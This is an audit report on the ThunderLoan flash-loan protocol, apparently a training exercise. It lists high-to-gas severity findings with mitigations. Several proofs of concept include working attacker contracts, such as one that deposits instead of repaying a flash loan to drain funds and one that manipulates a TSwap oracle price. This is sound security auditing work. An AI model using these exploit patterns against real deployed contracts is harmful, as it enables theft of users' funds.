---
title: Protocol Audit Report
author: github.com/nuelonye
date: September 14, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries ThunderLoan Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape github.com/nuelonye\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

Prepared by: [NuelOnye](https://githun.com/nuelonye)
Lead Auditors: 
- xxxxxxx

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Roles](#roles)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\]  Erroneous `ThunderLoan::updateExchangeRate` in `deposit` increases redeemable amount causing protocol to think it has more fees than it really does, which blocks redeemption and incorrectly sets the exchange rate](#h-1--erroneous-thunderloanupdateexchangerate-in-deposit-increases-redeemable-amount-causing-protocol-to-think-it-has-more-fees-than-it-really-does-which-blocks-redeemption-and-incorrectly-sets-the-exchange-rate)
    - [\[H-2\]  By calling a flashloan and then `ThunderLoan::deposit` instead of `ThunderLoan::repay` users can steal all funds from the protocol](#h-2--by-calling-a-flashloan-and-then-thunderloandeposit-instead-of-thunderloanrepay-users-can-steal-all-funds-from-the-protocol)
    - [\[H-3\]  Mixing up variable location causes storage collisions in `ThunderLoan::s_flashlLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol.](#h-3--mixing-up-variable-location-causes-storage-collisions-in-thunderloans_flashlloanfee-and-thunderloans_currentlyflashloaning-freezing-protocol)
  - [Medium](#medium)
    - [\[M-1\] Using TSwap as price oracle leads to price manipulation attacks](#m-1-using-tswap-as-price-oracle-leads-to-price-manipulation-attacks)
  - [\[M-2\]: Centralization Risk](#m-2-centralization-risk)
  - [Low](#low)
    - [\[L-1\] Missing critial event emissions](#l-1-missing-critial-event-emissions)
  - [\[L-2\] Initializers could be front-run](#l-2-initializers-could-be-front-run)
  - [Informational](#informational)
    - [\[I-1\]  `ThunderLoan` contract don't implement `IThunderLoan` interface which and lead to wrong implementation of certain functions](#i-1--thunderloan-contract-dont-implement-ithunderloan-interface-which-and-lead-to-wrong-implementation-of-certain-functions)
    - [\[I-2\]  Incorrect parameter name in `ThunderLoan::initialize`](#i-2--incorrect-parameter-name-in-thunderloaninitialize)
  - [Gas](#gas)
    - [\[G-1\] Unnecessary SLOAD when logging new exchange rate](#g-1-unnecessary-sload-when-logging-new-exchange-rate)
    - [\[G-2\] Using `private` rather than `public` for constants, saves gas](#g-2-using-private-rather-than-public-for-constants-saves-gas)

# Protocol Summary

The ThunderLoan protocol is meant to do the following:

1. Give users a way to create flash loans
2. Give liquidity providers a way to earn money off their capital

Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans!

# Disclaimer

The NuelOnye team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
- In Scope:
```
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```

## Roles

- Owner: The owner of the protocol who has the power to upgrade the implementation. 
- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
- User: A user who takes out flash loans from the protocol.

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 2                      |
| Low      | 2                      |
| Info     | 2                      |
| Gas      | 2                      |
| Total    | 11                     |

# Findings

## High

### [H-1]  Erroneous `ThunderLoan::updateExchangeRate` in `deposit` increases redeemable amount causing protocol to think it has more fees than it really does, which blocks redeemption and incorrectly sets the exchange rate

**Description:** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between assetTokens and underlying token. In a way it's responsible for keeping track of how may fees to give the liquidity providers.

However, the `deposit` function, updates this rate, without collecting any fees

```javascript
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        // @audit-high we shouldn't be updating exchange rate when a LP deposits
@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** Increasing the exchange rate means increasing the amount a Liquidity Provider can redeem. Therefore doing so when the protocol is not getting any fee or profit leaves the protocol in debt, meaning, there are more asset tokens than there are underlying tokens according to the increased exchange rate. So whenever a LP wants to withdraw their underlying, they can't because the Protocol don't have such amount to underlying tokens.

1. The `redeem` function is blocked, because the protocol's owed tokens is more than it has.
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more than deserved.

**Proof of Concept:**

1. LP deposits 1000 USDC
2. They get minted 1000 AssetToken
3. exhange rate increases from 1 : 1 to 1 : 1.125
4. LP tries to redeem 1000 * 1.125 = 1125 USDC
5. But protocol don't have that much it only has 1000 USDC
6. Liquidity Provider is locked out and can't wihdraw their USDC.

<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`

```javascript
    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // 1000e18 initial deposit
        // 3e17 fee accrued from a 100e18 loan
        // 1000e18 + 3e17 = 1003e17 new AssetToken balance
        // 1003.300,900,000,000,000,000 amount the LP is trying to redeem

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }
```
</details>

**Recommended Mitigation:** Protocol should remove `updateExchangeRate` (i.e., increasing since exchange rate can only increase) when a Liquidity Provider deposits. Rate should only increase when tokens are loaned and are succesfully repaid with fees.

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
.
.
.

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2]  By calling a flashloan and then `ThunderLoan::deposit` instead of `ThunderLoan::repay` users can steal all funds from the protocol

**Description:** The `ThunderLoan::flashloan` design is such what ever leaves the protocol (plus fee) must come back in the same transaction, without caring on how or what mechanism to which it comes back. This leaves a vulnerabilty where a user can loan some amount, and then deposit (return) the same amount to the protocol thereby making them a Liquidiity Provider.

**Impact:** A malicious user can repeatedly do this process and get minted unlimited Asset Tokens. Which can be used to drain all the underlying tokens in the protocol.

**Proof of Concept:**

1. Malicious user calls `ThunderLoan::flashloan` function to loan `50e18` underlying tokens
2. `flashloan` calls `executeOperation` function in Malicious user contract
3. The `executeOperation` calls `ThunderLoan::deposit` with `50e18` + fee
4. Malicious user is minted some Asset Tokens
5. `flashloan` completes since the loaned amount + fee is brought back
6. Malicious user can now redeem underlying tokens even though they didn't actually deposit their money.

<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`

```javascript
    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        // ThunderLoan sends us the money but instead or repaying, we deposit this means
        // 1. The balance is sent back and flashloan don't revert
        // 2. FlashLoanReceiver is minted AssetTokens which they can redeem for underlying tokens
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address,
        /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        // We don't need to call repay here, since the protocol only checks that loaned amount plus fee is brought back
        // we can use another mechanism(deposit) to increase the balance. This then mints us AssetTokens making us LPs
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
```

</details>

**Recommended Mitigation:** Protect the deposit path during a flash loan. Since ThunderLoan contract already has a transient flag `s_currentlyFlashLoaning[token]` In deposit, revert if a flash loan is currently active for that asset:

```diff 
+   if (s_currentlyFlashLoaning[token]) {
+       revert ThunderLoan__CannotDepositDuringFlashLoan();
    }
```

### [H-3]  Mixing up variable location causes storage collisions in `ThunderLoan::s_flashlLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol.

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order:

```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, breaks the storage locations as well.

**Impact:** After the uppgrade, the `s_flashLoanFee` wil have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charges the wrong fee.

More importantly, the `s_currentlyFlashLoaning` mappings with start in the wrong storage slot as well as all the other variables after it, going up a slot higher.

**Proof of Concept:**

1. `ThunderLoan` is initialized with `s_feePrecision` and `s_flashLoanFee` at storage slot `2` and `3` respectively
2. Where `s_feePrecision` = `1e18` and `s_flashLoanFee` = `3e15`
3. `ThunderLoan` is upgraded to `ThunderLoanUpgraded`
4. `s_feePrecision` is no longer in stoarge as it was initialized as a `constant` variable
5. `s_flashLoanFee` is now taking up storage slot `2` instead of initial `3`
6. User queries `ThunderLoanUgraded::getFee`, it returns the value at storage slot `2`: `1e18`
7. But that value is the precision value and the protocol's actual fee of `3e15`

<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`

```javascript
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.
function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console.log("Fee Before upgrade:", feeBeforeUpgrade);
        console.log("Fee After upgrade:", feeAfterUpgrade);
        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```

You could also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`

</details>

**Recommended Mitigation:** If you must remove the storage variable, leave it as blank as to not mess up the storage slot.

```diff
-   uint256 private s_flashLoanFee; // 0.3% ETH fee
-   uint256 public constant FEE_PRECISION = 1e18;
+   uint256 private s_blank;
+   uint256 private s_flashLoanFee; // 0.3% ETH fee
+   uint256 public constant FEE_PRECISION = 1e18;
```

## Medium

### [M-1] Using TSwap as price oracle leads to price manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity Providers will get drastically reduced fees for provided liquidity, since the value of the fee is determined by the manipulable protocol.

**Proof of Concept:**

The following all happens in 1 transaction.

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking its price
   2. Instead of repaying right away, the user takes out anther flash loan of 1000 `tokenA`
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper.
```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```
  3. The user then repays the first flash loan, and then repays the second flash loan.

<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`

```javascript
    function testOracleManipulation() public {
        // 1. Setup contracts!
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create a TSwap DEX between WETH and TokenA
        BuffMockTSwap tSwapPool = BuffMockTSwap(pf.createPool(address(tokenA)));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tSwapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tSwapPool), 100e18);
        tSwapPool.deposit(100e18, 100e18, 100e18, block.timestamp); // Ratio 1:1 -> 100 Weth & 100 TokenA
        vm.stopPrank();

        // 3. Fund ThunderLoan
        // set allow
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // Current State, there are:
        // 100 WETH & 100 TokenA in TSwap
        // 1000 TokenA in ThunderLoan that can be borrowed

        // Take out a flash loan of 50 tokenA
        // swap it on the dex, tankking price from 1weth = 1tokenA to 1weth = ~3tokenA
        // Take out ANOTHER flash loan of 50 tokenA (and we'll se how much cheaper it is)

        // 4. Take out 2 flash loan
        //      a. To nuke the price of the Weth/tokenA on TSwap
        //      b. To show that doing so greatly reduces the fees we pay on ThunderLoan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal Fee is:", normalFeeCost); // 0.296147410319118389

        uint256 amountToBorrow = 50e18; // we gonna borrow twice

        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tSwapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18); // so they can cover the fees
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack fee is:", attackFee); // 0.214167600932190305
        assert(attackFee < normalFeeCost);
    }

    contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    BuffMockTSwap tSwapPool;
    address repayAddress;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tSwapPool, address _thunderLoan, address _repayAddress) {
        tSwapPool = BuffMockTSwap(_tSwapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address,
        /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. Swap TokenA borrowed for WETH
            // 2. Take out ANOTHER flash loan, to show the difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tSwapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tSwapPool), 50e18);
            // This Tanks the price!
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // we call a second flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // repay first loan
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate the fee and repay
            feeTwo = fee;
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
```

</details>

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.

## [M-2]: Centralization Risk

**Description:** Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

<details><summary>6 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 289](src/protocol/ThunderLoan.sol#L289)

    ```solidity
        function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 324](src/protocol/ThunderLoan.sol#L324)

    ```solidity
        function updateFlashLoanFee(uint256 newFee) external onlyOwner {
    ```

- Found in src/protocol/ThunderLoan.sol [Line: 355](src/protocol/ThunderLoan.sol#L355)

    ```solidity
        function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 238](src/upgradedProtocol/ThunderLoanUpgraded.sol#L238)

    ```solidity
        function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 264](src/upgradedProtocol/ThunderLoanUpgraded.sol#L264)

    ```solidity
        function updateFlashLoanFee(uint256 newFee) external onlyOwner {
    ```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 287](src/upgradedProtocol/ThunderLoanUpgraded.sol#L287)

    ```solidity
        function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
    ```

</details>

## Low

### [L-1] Missing critial event emissions

**Description:** When the `ThunderLoan::s_flashLoanFee` is updated, there is no event emitted.

**Recommended Mitigation:** Emit an event when the `ThunderLoan::s_flashLoanFee` is updated.

```diff
+    event FlashLoanFeeUpdated(uint256 newFee);
.
.
.
    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
        if (newFee > s_feePrecision) {
            revert ThunderLoan__BadNewFee();
        }
        s_flashLoanFee = newFee;
+       emit FlashLoanFeeUpdated(newFee); 
    }
```

## [L-2] Initializers could be front-run

**Description:** Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment

*Instances (6)*:
```solidity
File: src/protocol/OracleUpgradeable.sol

11:     function __Oracle_init(address poolFactoryAddress) internal onlyInitializing {

```

```solidity
File: src/protocol/ThunderLoan.sol

138:     function initialize(address tswapAddress) external initializer {

138:     function initialize(address tswapAddress) external initializer {

139:         __Ownable_init();

140:         __UUPSUpgradeable_init();

141:         __Oracle_init(tswapAddress);

```

**Recommended Mitigation:** Ensure the the contract is initialized in the same transaction that it is deployed using script.

## Informational

### [I-1]  `ThunderLoan` contract don't implement `IThunderLoan` interface which and lead to wrong implementation of certain functions

**Description:** The `IThunderLoan` interface specifies a `repay(address,uint256)` function that takes two arguements. But the `ThunderLoan` contract don't inherit the interface hence, this function is not enforeced.

**Impact:** `ThunderLoan` contract may implement the `repay` function wrongly.

**Recommended Mitigation:** Ensure the `IThunderLoan` inherits the interface

```diff
-   contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable {
+   import {IThunderLoan} from "../src/interfaces/IThunderLoan.sol";
+   contract ThunderLoan is IThunderLoan, Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable {
```

### [I-2]  Incorrect parameter name in `ThunderLoan::initialize`

**Description:** The `initialize` function accepts an address parameter `poolFactoryAddress` but it is declared as `tswapPoolAddress`. This may be confusing and can lead to initializing the protocol with a wrong parameter.

```diff
    function initialize
    (
-       address tswapAddress
+       address poolFacotryAddress
    ) 
        external initializer 
    {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
-       __Oracle_init(tswapAddress);
+       __Oracle_init(poolFactoryAddress);
        s_feePrecision = 1e18;
        s_flashLoanFee = 3e15;
    }
```

## Gas

### [G-1] Unnecessary SLOAD when logging new exchange rate

**Description:** In `AssetToken::updateExchangeRate`, after writing the newExchangeRate to storage the function reads the value from storage again to log it in the ExchangeRateUpdated event.

To avoid the unnecessary SLOAD, you can log the value of newExchangeRate.

```diff
  s_exchangeRate = newExchangeRate;
- emit ExchangeRateUpdated(s_exchangeRate);
+ emit ExchangeRateUpdated(newExchangeRate);
```

### [G-2] Using `private` rather than `public` for constants, saves gas

**Description:** If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table

*Instances (3)*:
```solidity
File: src/protocol/AssetToken.sol

25:     uint256 public constant EXCHANGE_RATE_PRECISION = 1e18;

```

```solidity
File: src/protocol/ThunderLoan.sol

96:     uint256 public constant FEE_PRECISION = 1e18;

```